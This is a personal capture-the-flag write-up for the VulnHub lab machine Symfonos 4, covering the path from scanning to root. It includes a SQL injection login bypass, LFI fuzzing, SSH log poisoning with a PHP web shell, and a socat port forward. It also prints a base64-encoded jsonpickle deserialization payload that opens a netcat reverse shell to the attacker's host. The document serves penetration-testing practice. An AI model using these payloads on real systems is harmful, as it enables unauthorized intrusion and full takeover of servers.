# BOX NAME: Symfonos 4
**LINK**: https://www.vulnhub.com/entry/symfonos-4,347/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Inspect robots.txt - find atlantis.php 
2. Find some LFI logs.
3. Log poison.
4. Enumerate local box find a jsonpickle webserver running on port 8080. Portforward using socat.
5. Base64 encode a payload and paste it as a cookie into to jsonpickle page and recieve a revshell as root.

This box had me stumped. I had to lookup some writeups for this. Learnt some stuff about jsonpicke and cookie tampering. Good stuff!
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.59
[+] URL:	http://symfonos.local
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-symfonos4.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 20:06 CEST
Nmap scan report for symfonos.local (10.77.0.59)
Host is up (0.00042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 f9c17395a417dff6ed5c8e8ac805f98f (RSA)
|   256 bec1fdf13364399a683564f9bd27ec01 (ECDSA)
|_  256 66f76ae8edd51d2d36326439384f9c8a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-symfonos4.log  
http://symfonos.local [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.77.0.59]
```

nikto-scan

```
└─$ nikto -h $IP -C all | tee nikto-symfonos4.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.59
+ Target Hostname:    10.77.0.59
+ Target Port:        80
+ Start Time:         2023-04-28 20:06:41 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the 
´+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: c9, size: 59058b74c9871, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cve
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /manual/: Web server manual found.
+ /manual/images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 26640 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-04-28 20:09:42 (GMT2) (181 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```
└─$ ffuf -u $URL/FUZZ -w /base/wordlists/web-fuzz/combined_files.txt -e .php -mc 200 -s | tee ffuf-files-symfonos4.log
/atlantis.php
/gods/
/gods/hades.log
/gods/poseidon.log
/gods/zeus.log

/atlantis.php is a login page. I fired up burp to try and auth bypass that stuff. Worked with-
" ' or 1=1 -- -  ". It redirects to sea.php
there's a list redirecting to each of the logs with a drop-down list. "http://symfonos.local/sea.php?file=zeus"

└─$ ffuf -u http://symfonos.local/sea.php?file=FUZZ -w /base/wordlists/lfi/jml-lfi.txt -b 'PHPSESSID=rmb38o296ri459djh6f7h207t0' -fs 577 -s | tee ffuf-lfi-symfonos4.log
../../../../var/log/auth
../../../../../var/log/auth
../../../../../../var/log/auth
../../../../../../../var/log/auth
../../../../../../../../var/log/auth
../../../../../../../../../var/log/auth
../../../../../../../../../../var/log/auth
../../../../../../../../../../../var/log/auth
```
other

```
command-execution = view-source:http://symfonos.local/sea.php?file=../../../../../var/log/auth&cmd=ls%20-al
└─$ nc -lnvp 445    
listening on [any] 445 ...
connect to [10.77.0.35] from (UNKNOWN) [10.77.0.59] 50098
www-data@symfonos4:/var/www/html$   
```

</details>
<details><summary><ins>OTHER</ins></summary>

SSH (Port 22)
```
└─$ telnet $IP 22           
Trying 10.77.0.59...
Connected to 10.77.0.59.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.9p1 Debian-10


ssh '<?php system($_GET["cmd"]);?>'@symfonos.local
view-source:http://symfonos.local/sea.php?file=../../../../../var/log/auth&cmd=ls%20-al
```

DNS (Port 53)
```

```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
**SGID's**:

```
/usr/bin/crontab
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/dotlockfile
/usr/bin/ssh-agent
/usr/bin/chage
/usr/sbin/unix_chkpwd
```
**NET**:

```
www-data@symfonos4:/home$ ss -ralpn4
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port                                                                                   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      
tcp     LISTEN   0        5                0.0.0.0:4545          0.0.0.0:*       users:(("socat",pid=1988,fd=6))                                                
tcp     LISTEN   0        80             localhost:3306          0.0.0.0:*                                                                                      
tcp     LISTEN   0        128            localhost:8080          0.0.0.0:* 

socat tcp-listen:4545,fork tcp:127.0.0.1:8080 &
```
**OTHERS**:

```
ll /opt/code
4.0K drwxr-xrwx 4 root root 4.0K Aug 19  2019 .
4.0K -rw-r--r-- 1 root root 1.5K Aug 19  2019 app.pyc
4.0K -rw-r--r-- 1 root root  942 Aug 19  2019 app.py
4.0K -rw-r--r-- 1 root root  215 Aug 19  2019 wsgi.pyc
4.0K drwxr-xr-x 2 root root 4.0K Aug 19  2019 templates
4.0K drwxr-xr-x 4 root root 4.0K Aug 19  2019 static
4.0K drwxr-xr-x 3 root root 4.0K Aug 18  2019 ..

Original string       :: eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ==
base64 DEcoded string :: {"py/object": "app.User", "username": "Poseidon"}
```
```
This is a jsonpickle shit running...
After research I came accross this payload:
{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 172.168.0.108 5555"], 0, 0, 0]}


└─$ echo '{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 10.77.0.35 5555"], 0, 0, 0]}' | base64 | tr -d '\n'
eyJweS9vYmplY3QiOiJfX21haW5fXy5TaGVsbCIsInB5L3JlZHVjZSI6W3sicHkvZnVuY3Rpb24iOiJvcy5zeXN0ZW0ifSxbIi91c3IvYmluL25jIC1lIC9iaW4vc2ggMTAuNzcuMC4zNSA1NTU1Il0sIDAsIDAsIDBdfQo=
``` 
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=74b561ac50211ad8cbc1d93820be3c212696274f, stripped                                                                                                                         
                                                                                                                                                   
                                                                                                                                                   
No LSB modules are available.                                                                                                                                                           
Distributor ID: Debian                                                                                                                                                                  
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster


Linux symfonos4 4.19.0-5-686 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) i686 GNU/Linux

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

poseidon
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
└─$ echo '{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 10.77.0.35 5555"], 0, 0, 0]}' | base64 | tr -d '\n'
eyJweS9vYmplY3QiOiJfX21haW5fXy5TaGVsbCIsInB5L3JlZHVjZSI6W3sicHkvZnVuY3Rpb24iOiJvcy5zeXN0ZW0ifSxbIi91c3IvYmluL25jIC1lIC9iaW4vc2ggMTAuNzcuMC4zNSA1NTU1Il0sIDAsIDAsIDBdfQo=
```

```
┌──(jockemedlinux㉿jml)-[~/GIT/writeups/VulnHUB/symfonos4]
└─$ nc -lnvp 5555                          
listening on [any] 5555 ...
connect to [10.77.0.35] from (UNKNOWN) [10.77.0.59] 54820
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
cat /root/proof.txt

        Congrats on rooting symfonos:4!
 ~         ~            ~     w   W   w
                    ~          \  |  /       ~
        ~        ~        ~     \.|./    ~
                                  |
                       ~       ~  |           ~
       o        ~   .:.:.:.       | ~
  ~                 wwWWWww      //   ~
            ((c     ))"""((     //|        ~
   o       /\/\((  (( 6 6 ))   // |  ~
          (d d  ((  )))^(((   //  |
     o    /   / c((-(((')))-.//   |     ~
         /===/ `) (( )))(( ,_/    |~
  ~     /o o/  / c((( (()) |      |  ~          ~
     ~  `~`^  / c (((  ))  |      |          ~
             /c  c(((  (   |  ~   |      ~
      ~     /  c  (((  .   |      |   ~           ~
           / c   c ((^^^^^^`\   ~ | ~        ~
          |c  c c  c((^^^ ^^^`\   |
  ~        \ c   c   c(^^^^^^^^`\ |    ~
       ~    `\ c   c  c;`\^^^^^./ |             ~
              `\c c  c  ;/^^^^^/  |  ~
   ~        ~   `\ c  c /^^^^/' ~ |       ~
         ~        `;c   |^^/'     o
             .-.  ,' c c//^\\         ~
     ~      ( @ `.`c  -///^\\\  ~             ~
             \ -` c__/|/     \|
      ~       `---'   '   ~   '          ~
 ~          ~          ~           ~             ~
        Contact me via Twitter @zayotic to give feedback!

```

</details>